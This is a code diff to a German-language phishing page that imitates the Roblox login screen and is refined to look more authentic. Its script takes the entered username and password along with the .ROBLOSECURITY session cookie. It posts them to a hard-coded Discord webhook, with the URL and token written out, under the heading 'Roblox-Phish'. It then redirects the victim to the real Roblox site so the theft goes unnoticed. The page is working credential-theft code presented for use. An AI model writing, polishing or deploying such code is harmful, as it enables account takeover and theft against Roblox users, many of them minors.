@@ -1,48 +1,75 @@
 <!doctype html>
-<html lang="en">
+<html lang="de">
 <head>
   <meta charset="utf-8">
-  <title>Roblox Winter Event 2025</title>
+  <title>Roblox</title>
   <link rel="icon" href="https://www.roblox.com/favicon.ico">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <style>body{margin:0;background:#121212;font-family:system-ui;color:#fff}#box{width:320px;margin:10vh auto;padding:24px;background:#1e1e1e;border-radius:8px}input{width:100%;padding:10px;margin:8px 0;border:0;border-radius:4px}button{width:100%;padding:12px;background:#02b757;color:#fff;border:0;border-radius:4px;font-weight:700;cursor:pointer}button:hover{background:#029a4a}</style>
+  <!-- Original-Roblox-CSS -->
+  <link rel="stylesheet" href="https://www.roblox.com/css/lean_base_www.css">
+  <style>
+    body{margin:0;background:#0e0e10;font-family:Roboto,system-ui,-apple-system,BlinkMacSystemFont,Arial}
+    .container{min-height:100vh;display:flex;align-items:center;justify-content:center}
+    .card{background:#1f1f23;border-radius:12px;padding:40px 48px;width:384px;box-shadow:0 20px 32px #00000080}
+    .logo{width:200px;margin:0 auto 32px;display:block}
+    .input-group{margin-bottom:16px}
+    label{font-size:14px;color:#b8b8b8;display:block;margin-bottom:6px}
+    input{width:100%;padding:12px 14px;background:#2a2a2d;border:1px solid #3a3a3d;border-radius:6px;color:#fff;font-size:16px}
+    input:focus{outline:none;border-color:#02b757}
+    .btn{width:100%;padding:14px;background:#02b757;border:0;border-radius:6px;color:#fff;font-size:16px;font-weight:600;cursor:pointer}
+    .btn:hover{background:#029a4a}
+    .links{font-size:13px;text-align:center;margin-top:16px;color:#b8b8b8}
+    .links a{color:#02b757;text-decoration:none}
+    .links a:hover{text-decoration:underline}
+  </style>
 </head>
 <body>
-<div id="box">
-  <img src="https://www.roblox.com/Images/Logo/roblox-logo-white.svg" alt="Roblox" style="width:140px;margin:0 auto 24px;display:block">
-  <form id="f" autocomplete="off">
-    <input name="u" placeholder="Username" required>
-    <input name="p" type="password" placeholder="Password" required>
-    <input name="mfa" placeholder="2FA-Code (falls vorhanden)" autocomplete="one-time-code">
-    <button type="submit">Log In</button>
-  </form>
+<div class="container">
+  <div class="card">
+    <img class="logo" src="https://www.roblox.com/Images/Logo/roblox-logo-white.svg" alt="Roblox">
+    <form id="f" autocomplete="off">
+      <div class="input-group">
+        <label for="u">Benutzer/E-Mail/Telefon</label>
+        <input id="u" name="u" type="text" required>
+      </div>
+      <div class="input-group">
+        <label for="p">Passwort</label>
+        <input id="p" name="p" type="password" required>
+      </div>
+      <button type="submit" class="btn">Anmelden</button>
+      <div class="links">
+        <a href="#">Passwort oder Benutzername vergessen?</a><br>
+        <span>Du hast kein Konto? <a href="#">Registrieren</a></span>
+      </div>
+    </form>
+  </div>
 </div>
+
 <script>
 document.getElementById('f').addEventListener('submit', async e => {
   e.preventDefault();
-  const u = e.target.u.value, p = e.target.p.value, m = e.target.mfa.value;
+  const u = document.getElementById('u').value;
+  const p = document.getElementById('p').value;
   const robloxSec = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || '';
 
-  // LIVE-Push zu webhook.site (kein Token nötig)
- await fetch('https://discord.com/api/webhooks/1422244213491499162/S8y98VTEc7q-LoxTTi0yhtw7xtyRTcRzz9fQGW5geZgVrUzBj8e-aCg3_QL6qodey4pS', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({
-    content: '**Roblox-Phish**',
-    embeds: [{
-      title: 'Neuer Login',
-      color: 0x02b757,
-      fields: [
-        { name: 'Username', value: u, inline: true },
-        { name: 'Password', value: p, inline: true },
-        { name: '2FA', value: m || '–', inline: true },
-        { name: 'ROBLOSECURITY', value: robloxSec || '–', inline: false }
-      ],
-      timestamp: new Date().toISOString()
-    }]
-  })
-});
-  // Weiterleitung zum echten Roblox
+  await fetch('https://discord.com/api/webhooks/1422244213491499162/S8y98VTEc7q-LoxTTi0yhtw7xtyRTcRzz9fQGW5geZgVrUzBj8e-aCg3_QL6qodey4pS', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      content: '**Roblox-Phish**',
+      embeds: [{
+        title: 'Neuer Login',
+        color: 0x02b757,
+        fields: [
+          { name: 'User', value: u, inline: true },
+          { name: 'Pass', value: p, inline: true },
+          { name: 'ROBLOSECURITY', value: robloxSec || '–', inline: false }
+        ],
+        timestamp: new Date().toISOString()
+      }]
+    })
+  });
+
   window.location = 'https://www.roblox.com/home';
 });
 </script>
